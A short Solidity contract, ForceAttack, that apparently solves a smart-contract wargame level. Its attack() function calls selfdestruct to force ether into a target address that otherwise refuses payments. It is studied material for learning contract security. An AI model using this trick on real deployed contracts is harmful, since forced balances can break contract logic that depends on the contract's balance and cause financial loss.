//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

contract ForceAttack {
    address forceAddress;

    constructor(address _forceAddress) public {
        forceAddress = _forceAddress;
    }

    function attack() public payable {
        selfdestruct(payable(forceAddress));
    }
}
